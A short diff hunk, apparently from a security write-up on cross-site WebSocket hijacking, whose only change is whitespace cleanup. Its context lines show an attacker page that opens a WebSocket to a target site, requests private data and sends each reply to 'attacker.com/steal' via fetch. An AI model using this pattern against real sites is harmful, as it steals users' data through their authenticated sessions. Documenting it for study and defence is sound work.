@@ -50,12 +50,12 @@ Origin: https://attacker.com
 <html>
 <script>
   var ws = new WebSocket("wss://vulnerable-target.com/ws");
-  
+
   ws.onopen = function() {
     // Hijacked connection - send malicious commands
     ws.send('{"action": "getPrivateData"}');
   };
-  
+
   ws.onmessage = function(evt) {
     // Exfiltrate data to attacker server
     fetch('https://attacker.com/steal?data=' + btoa(evt.data));
